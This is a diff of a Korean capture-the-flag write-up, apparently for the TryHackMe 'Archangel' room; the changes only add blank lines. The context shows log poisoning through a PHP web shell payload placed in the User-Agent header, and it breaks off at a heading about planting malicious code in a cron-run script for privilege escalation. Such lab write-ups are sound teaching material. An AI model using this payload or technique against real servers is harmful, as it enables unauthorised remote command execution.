@@ -190,6 +190,7 @@ echo 'CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aX
 
 ## 내부침투
 ### Log Poisoning 취약점 공격
+
 ![그림1-4](/assets/image/thm_archangel/image4.png)
 - access.log 파일에 성공적으로 접근할 수 있었으며
 - 해당 파일에는 클라이언트의 User-Agent 정보가 기록된다.
@@ -217,8 +218,10 @@ User-Agent: <?php system($_GET['cmd']);?>
 
 ![그림 1-8](/assets/image/thm_archangel/image8.png)
 - 성공적으로 웹 서버의 쉘을 획득했다.
+
 ## 시스템 권한 상승
 ### opt 디렉터리 내 의심 파일 확인
+
 > opt 디렉터리는 사용자가 따로 외부 프로그램을 설치하는 경로이다.
 - opt 경로에 사용자가 임의로 생성한 디렉터리와 파일이 존재했다.
 
@@ -238,6 +241,7 @@ cat helloworld.sh
 echo "hello world" >> /opt/backupfiles/helloworld.txt
 ```
 - hello wold 라는 문자를 백업 디렉터리 내에 텍스트 파일에 추가하고 있다.
+
 ### cron 작업을 하는 파일 내 악성 코드 삽입
 
 ```
